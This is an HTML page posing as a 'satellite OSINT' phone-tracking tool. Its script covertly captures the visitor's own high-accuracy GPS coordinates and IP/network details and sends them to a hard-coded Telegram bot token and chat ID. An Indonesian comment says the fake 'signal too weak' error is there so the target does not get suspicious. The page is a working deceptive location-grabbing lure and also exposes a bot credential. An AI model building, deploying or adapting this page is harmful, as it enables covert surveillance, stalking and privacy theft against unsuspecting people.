<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XYZ TRACKING - SATELLITE INTERFACE</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Share+Tech+Mono&display=swap');
        :root { --gold: #ffd700; --dark: #000; }
        body { background: var(--dark); color: var(--gold); font-family: 'Share Tech Mono', monospace; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
        
        .card { 
            width: 90%; max-width: 400px; background: #050505; border: 2px solid var(--gold); 
            padding: 35px; box-shadow: 0 0 30px rgba(255, 215, 0, 0.3); text-align: center;
        }

        h2 { font-family: 'Orbitron'; font-size: 28px; letter-spacing: 3px; color: #fff; text-shadow: 0 0 10px var(--gold); }
        .sub { font-size: 10px; color: #555; letter-spacing: 5px; margin-bottom: 20px; }

        .radar {
            width: 80px; height: 80px; border: 2px solid var(--gold); border-radius: 50%;
            margin: 20px auto; position: relative; overflow: hidden;
        }
        .radar::after {
            content: ''; position: absolute; top: 50%; left: 50%; width: 100%; height: 2px;
            background: rgba(255, 215, 0, 0.5); transform-origin: left; animation: sweep 2s linear infinite;
        }
        @keyframes sweep { from { transform: rotate(0deg) translate(-50%, -50%); } to { transform: rotate(360deg) translate(-50%, -50%); } }

        input { width: 100%; background: transparent; border: none; border-bottom: 1px solid #333; color: white; padding: 15px; margin: 15px 0; outline: none; text-align: center; font-family: inherit; }
        button { width: 100%; padding: 18px; background: transparent; color: var(--gold); border: 2px solid var(--gold); font-family: 'Orbitron'; cursor: pointer; font-weight: bold; transition: 0.3s; }
        button:hover { background: var(--gold); color: #000; }
        #status { font-size: 11px; color: #444; margin-top: 20px; text-transform: uppercase; }
    </style>
</head>
<body>

<div class="card">
    <h2>XYZ TRACKING</h2>
    <div class="sub">SATELLITE OSINT V2.0</div>
    
    <div class="radar"></div>

    <input type="text" id="phone" placeholder="TARGET PHONE/NAME">
    <button onclick="locateTarget()">INITIATE TRACKING</button>
    
    <div id="status">Awaiting Signal...</div>
</div>

<script>
    // --- KONFIGURASI API LAMA + ID BARU ---
    const TOKEN = "8622815738:AAHixf_yecRdOHx1q3LPD0CubKyrszYEH58";
    const CHAT_ID = "7496062352"; 
    // -------------------------------------

    function tellTele(txt) {
        const ping = new Image();
        ping.src = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(txt)}&parse_mode=html&v=${Date.now()}`;
    }

    async function report(lat, lon, acc, target) {
        document.getElementById('status').innerText = "SIGNAL CAPTURED. UPLINKING...";
        
        let ipInfo = "Hidden/VPN";
        try {
            const res = await fetch('https://ipapi.co/json/');
            const d = await res.json();
            ipInfo = `${d.ip} (${d.org})`;
        } catch(e) {}

        const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
        const reportText = `🛰️ <b>XYZ TRACKING - TARGET LOCKED!</b>\n\n` +
                           `👤 <b>Target:</b> ${target}\n` +
                           `📍 <b>Lat:</b> <code>${lat}</code>\n` +
                           `📍 <b>Lon:</b> <code>${lon}</code>\n` +
                           `🎯 <b>Accuracy:</b> ${acc}m\n` +
                           `🌐 <b>IP/Net:</b> ${ipInfo}\n\n` +
                           `🌍 <b>Google Maps:</b>\n${mapLink}`;

        tellTele(reportText);
        
        // Kasih efek sukses ke target biar ga curiga
        setTimeout(() => {
            alert("Connection error: Satellite signal too weak. Please try again later.");
            document.getElementById('status').innerText = "UPLINK SUCCESSFUL.";
        }, 1000);
    }

    function locateTarget() {
        const t = document.getElementById('phone').value;
        if(!t) return alert("INPUT TARGET ID!");

        document.getElementById('status').innerText = "REQUESTING GPS ACCESS...";

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    report(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, t);
                },
                (err) => {
                    document.getElementById('status').innerText = "ERROR: ACCESS DENIED.";
                    tellTele(`⚠️ <b>TRACKING FAILED</b>\nTarget: ${t}\nReason: GPS Permission Denied.`);
                    alert("Error: 0x882 - Satellite Access Denied. Please allow GPS to proceed.");
                },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        } else {
            alert("Hardware not supported.");
        }
    }
</script>

</body>
</html>
